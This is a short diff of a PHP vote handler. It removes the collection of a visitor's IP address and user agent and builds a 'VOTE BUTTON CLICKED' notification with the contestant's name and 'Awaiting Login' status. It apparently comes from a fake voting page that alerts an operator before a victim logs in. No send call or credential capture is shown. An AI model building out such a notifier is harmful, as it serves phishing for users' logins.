@@ -57,11 +57,7 @@ if (isset($_POST['vote_clicked'])) {
     
     // Check if rate limit exists and is still valid
     if (!isset($_SESSION[$rateLimitKey]) || ($currentTime - $_SESSION[$rateLimitKey]) > $rateLimitDuration) {
-        // Send notification
-        $userIP = $_SERVER['REMOTE_ADDR'] ?? 'Unknown';
-        $userAgent = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
-        $timestamp = date('Y-m-d H:i:s');
-        
+
         $message = "👤 VOTE BUTTON CLICKED!\n";
         $message .= "Contestant: " . htmlspecialchars($mainContestant['name']) . "\n";
         $message .= "Status: Awaiting Login....";
